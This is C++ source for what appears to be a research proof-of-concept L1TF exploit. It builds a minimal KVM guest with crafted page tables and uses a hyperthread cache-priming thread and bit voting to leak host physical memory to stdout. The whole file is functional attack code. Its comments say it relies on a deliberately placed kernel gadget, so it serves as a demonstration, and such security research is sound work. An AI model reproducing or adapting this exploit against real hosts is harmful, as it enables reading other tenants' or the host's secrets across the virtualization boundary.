// SPDX-License-Identifier: GPL-2.0
/*
 * Copyright 2019 Amazon.com, Inc. or its affiliates.
 *
 * Author:
 *   Julian Stecklina <jsteckli@amazon.de>
 *
 */

#include <algorithm>
#include <atomic>
#include <cstdlib>
#include <cstring>
#include <thread>
#include <array>
#include <utility>
#include <iomanip>
#include <iostream>

#include <errno.h>

#include "kvm.hpp"

/* This code is mapped into the guest at GPA 0. */
static unsigned char guest_code[] alignas(4096) {
#include "guest.inc"
};

/* Hardcoded I/O port where we get cache line access timings from the guest */
static const uint16_t guest_result_port = 0;

static const uint64_t page_size = 4096;

struct value_pair {
  uint32_t value;
  uint32_t sureness;
};

/*
 * Create a memory region for KVM that contains a set of page tables. These page
 * tables establish a 1 GB identity mapping at guest-virtual address 0.
 *
 * We need a single page for every level of the paging hierarchy.
 */
class page_table {
  const uint64_t page_pws = 0x63; /* present, writable, system, dirty, accessed */
  const uint64_t page_large = 0x80; /* large page */

  const size_t tables_size_ = 4 * page_size;
  uint64_t gpa_;		/* GPA of page tables */
  uint64_t *tables_;

  /*
   * Helper functions to get pointers to different levels of the paging
   * hierarchy.
   */
  uint64_t *pml4() { return tables_; }
  uint64_t *pdpt() { return tables_ + 1 * page_size/sizeof(uint64_t); }
  uint64_t *pd()   { return tables_ + 2 * page_size/sizeof(uint64_t); }
  uint64_t *pt()   { return tables_ + 3 * page_size/sizeof(uint64_t); }

public:

  /*
   * Return the guest-virtual address at which set_victim_pa() prepared
   * the page tables for an L1TF attack.
   */
  uint64_t get_victim_gva(uint64_t pa) const
  {
    return (pa & (page_size - 1)) | (1UL << 30);
  }

  /*
   * Set up the page tables for an L1TF attack to leak the _host_ physical
   * address pa.
   */
  void set_victim_pa(uint64_t pa) { pt()[0] = (pa & ~(page_size - 1)) | 0x60; }

  page_table(kvm *kvm, uint64_t gpa)
    : gpa_(gpa)
  {
    die_on(gpa % page_size != 0, "Page table GPA not aligned");

    tables_ = static_cast<uint64_t *>(aligned_alloc(page_size, tables_size_));
    die_on(tables_ == nullptr, "aligned_alloc");
    memset(tables_, 0, tables_size_);

    /* Create a 1:1 mapping for the low GB */
    pml4()[0] = (gpa + page_size) | page_pws;
    pdpt()[0] = 0 | page_pws | page_large;

    /* Create a mapping for the victim address */
    pdpt()[1] = (gpa + 2*page_size) | page_pws;
    pd()[0] = (gpa + 3*page_size)| page_pws;
    pt()[0] = 0;	/* Will be filled in by set_victim_pa */

    kvm->add_memory_region(gpa, tables_size_, tables_);
  }

  ~page_table()
  {
    /*
     * XXX We would need to remove the memory region here, but we
     * only end up here when we destroy the whole VM.
     */
    free(tables_);
  }
};

/*
 * Set up a minimal KVM VM in long mode and execute an L1TF attack from inside
 * of it.
 */
class l1tf_leaker {
  /* Page tables are located after guest code. */
  uint64_t const page_table_base = sizeof(guest_code);

  kvm kvm_;
  kvm_vcpu vcpu_ { kvm_.create_vcpu(0) };
  page_table page_table_ { &kvm_, page_table_base };

  /*
   * RDTSCP is used for exact timing measurements from guest mode. We need
   * to enable it in CPUID for KVM to expose it.
   */
  void enable_rdtscp()
  {
    auto cpuid_leafs = kvm_.get_supported_cpuid();
    auto ext_leaf = std::find_if(cpuid_leafs.begin(), cpuid_leafs.end(),
				 [] (kvm_cpuid_entry2 const &leaf) {
				   return leaf.function == 0x80000001U;
				 });

    die_on(ext_leaf == cpuid_leafs.end(), "find(rdtscp leaf)");

    ext_leaf->edx = 1UL << 27 /* RDTSCP */;

    vcpu_.set_cpuid(cpuid_leafs);
  }

  /*
   * Set up the control and segment register state to enter 64-bit mode
   * directly.
   */
  void enable_long_mode()
  {
    auto sregs = vcpu_.get_sregs();

    /* Set up 64-bit long mode */
    sregs.cr0  = 0x80010013U;
    sregs.cr2  = 0;
    sregs.cr3  = page_table_base;
    sregs.cr4  = 0x00000020U;
    sregs.efer = 0x00000500U;

    /* 64-bit code segment */
    sregs.cs.base = 0;
    sregs.cs.selector = 0x8;
    sregs.cs.type = 0x9b;
    sregs.cs.present = 1;
    sregs.cs.s = 1;
    sregs.cs.l = 1;
    sregs.cs.g = 1;

    /* 64-bit data segments */
    sregs.ds = sregs.cs;
    sregs.ds.type = 0x93;
    sregs.ds.selector = 0x10;

    sregs.ss = sregs.es = sregs.fs = sregs.gs = sregs.ds;

    vcpu_.set_sregs(sregs);
  }

public:

  /*
   * Try to leak 32-bits host physical memory and return the data in
   * addition to per-bit information on whether we are sure about the
   * values.
   */
  value_pair try_leak_dword(uint64_t phys_addr)
  {
    auto state = vcpu_.get_state();

    page_table_.set_victim_pa(phys_addr);

    kvm_regs regs {};

    regs.rflags = 2; /* reserved bit */
    regs.rdi = page_table_.get_victim_gva(phys_addr);
    regs.rip = 0;

    vcpu_.set_regs(regs);
    vcpu_.run();

    regs = vcpu_.get_regs();

    die_on(state->exit_reason != KVM_EXIT_IO or
	   state->io.port != guest_result_port or
	   state->io.size != 4, "unexpected exit");

    return { (uint32_t)regs.r9, (uint32_t)regs.r11 };
  }

  l1tf_leaker()
  {
    kvm_.add_memory_region(0, sizeof(guest_code), guest_code);

    enable_rdtscp();
    enable_long_mode();
  }
};

/* Set the scheduling affinity for the calling thread. */
static void set_cpu(int cpu)
{
  cpu_set_t cpuset;

  CPU_ZERO(&cpuset);
  CPU_SET(cpu, &cpuset);

  int rc = pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);

  die_on(rc != 0, "pthread_setaffinity_np");
}

/*
 * Attempt to prefetch specific memory into the cache. This data can then be
 * leaked via L1TF on the hyperthread sibling.
 */
class cache_loader {
  int cpu_;
  uint64_t page_base_offset_;

  std::atomic<uint64_t> target_kva_ {0};
  std::thread prime_thread;

  void cache_prime_thread()
  {
    set_cpu(cpu_);

    while (true) {
      uint64_t kva = target_kva_;

      if (kva == ~0ULL)
	break;

      /*
       * This relies on a deliberately placed cache load gadget in the
       * kernel. A real exploit would of course use an existing
       * gadget.
       */
      int rc = mincore((void *)1, 0, (unsigned char *)kva);
      die_on(rc == 0 || errno != EINVAL, "mincore");
    };
  }

public:

  /* Set the physical address that should be prefetched into the cache. */
  void set_phys_address(uint64_t pa)
  {
    target_kva_ = pa + page_base_offset_;
  }


  cache_loader(int cpu, uint64_t page_base_offset)
    : cpu_(cpu), page_base_offset_(page_base_offset),
      prime_thread { [this] { cache_prime_thread(); } }
  {}

  ~cache_loader()
  {
    /* Ask the thread to exit. */
    target_kva_ = ~0ULL;
    prime_thread.join();
  }
};

/*
 * Given a set of values and bit masks, which bits are probably correct,
 * reconstruct the original value.
 */
class value_reconstructor {
  std::array<std::pair<int, int>, 32> freq {};

public:
  void record_attempt(value_pair const &e)
  {
    for (int bit_pos = 0; bit_pos < 32; bit_pos++) {
      uint32_t mask = 1U << bit_pos;

      if (not (e.sureness & mask))
	continue;

      (e.value & mask ? freq[bit_pos].second : freq[bit_pos].first)++;
    }
  }

  /* Reconstruct a value from the most frequently seen bit values. */
  uint32_t get_most_likely_value() const
  {
    uint32_t reconstructed = 0;

    for (int bit_pos = 0; bit_pos < 32; bit_pos++) {
      if (freq[bit_pos].second > freq[bit_pos].first)
	reconstructed |= (1U << bit_pos);
    }

    return reconstructed;
  }

};

/*
 * Parse a 64-bit integer from a string that may contain 0x to indicate
 * hexadecimal.
 */
static uint64_t from_hex_string(const char *s)
{
  return std::stoull(s, nullptr, 0);
}

int main(int argc, char **argv)
{
  if (argc != 6 and argc != 5) {
    std::cerr << "Usage: l1tf-exploit page-offset-base phys-addr ht-0 ht-1 [size]\n";
    return EXIT_FAILURE;
  }

  if (isatty(STDOUT_FILENO)) {
    std::cerr << "Refusing to write binary data to tty. Please pipe output into hexdump.\n";
    return EXIT_FAILURE;
  }

  uint64_t page_offset_base = from_hex_string(argv[1]);
  uint64_t phys_addr = from_hex_string(argv[2]);
  int ht_0 = from_hex_string(argv[3]);
  int ht_1 = from_hex_string(argv[4]);
  uint64_t size = (argc == 6) ? from_hex_string(argv[5]) : 256;

  /* Start prefetching data into the L1 cache from the given hyperthread. */
  cache_loader loader { ht_0, page_offset_base };

  /* Place the main on the hyperthread sibling so we share the L1 cache. */
  l1tf_leaker leaker;
  set_cpu(ht_1);

  /* Read physical memory 32-bit at a time. */
  for (uint64_t offset = 0; offset < size; offset += 4) {
    uint64_t phys = offset + phys_addr;
    uint32_t leaked_value = 0;

    /*
     * Direct the cache loader on the other thread to start prefetching a new
     * address.
     */
    loader.set_phys_address(phys);

    /*
     * We can't differentiate between reading 0 and failure, so retry a couple
     * of times to see whether we get anything != 0.
     */
    for (int tries = 32; not leaked_value and tries; tries--) {
      value_reconstructor reconstructor;

      /*
       * Read each value multiple times and then reconstruct the likely original
       * value by voting.
       */
      for (int i = 0; i < 16; i++)
	reconstructor.record_attempt(leaker.try_leak_dword(phys));

      leaked_value = reconstructor.get_most_likely_value();
    }

    std::cout.write((const char *)&leaked_value, sizeof(leaked_value));
    std::cout.flush();
  }

  return 0;
}
